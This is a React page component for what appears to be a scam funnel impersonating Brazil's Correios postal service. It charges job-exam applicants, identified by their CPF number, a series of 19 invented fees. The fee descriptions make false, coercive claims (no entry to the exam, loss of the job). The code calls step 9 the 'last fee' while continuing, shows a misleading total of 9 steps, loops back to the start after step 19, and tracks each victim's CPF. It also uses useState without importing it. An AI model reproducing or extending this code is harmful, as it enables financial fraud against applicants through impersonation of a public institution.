import { useEffect } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import UpsellStep from "@/components/UpsellStep";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";

import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const UPSELLS = [
  { valor: 47, title: "Confirmação da Inscrição", description: "Você fez a inscrição, mas ela ainda não foi confirmada no sistema. Sem a confirmação, sua vaga não fica reservada." },
  { valor: 37, title: "Confirmação do Local da Prova", description: "Confirme o local da prova mais perto de você. Sem a confirmação, você será alocado em qualquer local com vaga disponível." },
  { valor: 39, title: "Cartão de Acesso à Prova", description: "Este cartão é o documento que você apresenta no dia da prova. Sem ele, você não entra na sala." },
  { valor: 27, title: "Seguro do Candidato", description: "Se o concurso for cancelado ou adiado, você recebe todo o dinheiro de volta. Sem o seguro, você perde tudo que pagou." },
  { valor: 33, title: "Apostila Digital Oficial", description: "Apostila completa com todo o conteúdo que cai na prova, feita pela banca organizadora." },
  { valor: 24, title: "Simulado Online da Banca", description: "Faça um simulado no mesmo formato da prova real. Você vai saber exatamente como vai ser no dia." },
  { valor: 19, title: "Certificado de Pré-Aprovação", description: "Documento que comprova que você cumpriu todos os requisitos. Pode usar pra pedir folga no trabalho no dia da prova." },
  { valor: 15, title: "Acompanhamento por SMS e E-mail", description: "Fique sabendo de tudo: mudança de data, local, gabarito, resultado. Quem não se cadastra, perde prazo e perde vaga." },
  { valor: 97, title: "Garantia de Vaga na Região", description: "Essa é a última taxa. Com ela, você garante que se passar, vai trabalhar na agência mais perto da sua casa." },
  { valor: 29, title: "Kit Documentos para Posse", description: "Todos os documentos necessários para tomar posse. Sem eles, mesmo aprovado, você perde a vaga." },
  { valor: 57, title: "Curso Preparatório Express", description: "Curso intensivo de 7 dias focado no que cai na prova. Candidatos preparados passam 3x mais." },
  { valor: 22, title: "Recurso Administrativo", description: "Modelos de recurso prontos e orientação jurídica. Se a prova tiver erro, você pode contestar e ganhar pontos." },
  { valor: 17, title: "Atualização do Edital", description: "Receba imediatamente qualquer mudança no edital. Datas, conteúdos e vagas mudam sem aviso." },
  { valor: 31, title: "Prioridade na Correção", description: "Sua prova corrigida em até 48h. Saiba o resultado antes de todo mundo." },
  { valor: 23, title: "Certificado de Conclusão de Curso", description: "Validação do seu certificado escolar. Obrigatório para a posse — sem ele, você é eliminado." },
  { valor: 14, title: "Acesso ao Grupo VIP", description: "Grupo exclusivo com dicas, macetes e troca de experiências entre candidatos sérios." },
  { valor: 18, title: "Seguro Contra Atraso", description: "Se você não conseguir chegar na prova por imprevisto, recebe reembolso integral." },
  { valor: 43, title: "Consultoria Individual", description: "Orientação personalizada de um especialista. Plano de estudo feito sob medida pro seu perfil." },
  { valor: 67, title: "Pacote de Posse Garantida", description: "Pacote completo: documentação, exames, orientação jurídica. Tudo para tomar posse sem problemas." },
];

const Upsell = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 19);
  const currentIndex = stepNumber - 1;
  const currentUpsell = UPSELLS[currentIndex];

  const [valorComCentavos] = useState(() => currentUpsell.valor + (Math.floor(Math.random() * 99) + 1) / 100);

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePaymentConfirmed = () => {
    const stateData = { cpfData, valorBeneficio, protocolo };
    if (stepNumber < 19) {
      navigate(`/upsell-info/${stepNumber + 1}`, { state: stateData });
    } else {
      navigate("/upsell-info/1", { state: stateData });
    }
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Inscrição > Taxas" />

      <main className="flex-1 flex items-center justify-center px-4 py-6 sm:py-8">
        <UpsellStep
          key={stepNumber}
          title={currentUpsell.title}
          description={currentUpsell.description}
          valor={valorComCentavos}
          cpfData={cpfData}
          protocolo={protocolo || `COR${Date.now()}`}
          onPaymentConfirmed={handlePaymentConfirmed}
          stepNumber={stepNumber}
          totalSteps={9}
        />
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default Upsell;
